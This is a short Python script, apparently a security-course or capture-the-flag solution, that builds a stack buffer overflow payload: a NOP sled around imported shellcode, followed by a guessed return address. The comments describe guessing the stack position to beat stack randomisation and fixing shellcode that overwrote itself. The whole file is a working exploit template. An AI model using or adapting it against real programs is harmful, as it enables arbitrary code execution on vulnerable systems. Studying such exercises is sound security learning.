from struct import pack
from shellcode import shellcode
import sys
sys.stdout.buffer.write(bytes.fromhex('90' * 950) + shellcode + bytes.fromhex('90' * 63) + pack("<I", 0xfffea702))
#bypassing variable stack positioning
#overwrite most of the buffer with '90' == nop instruction
#place shellcode in the middle of nops
#	ran into problem where shellcode was overwriting itself
#"guess" stack position as max/min +/-250
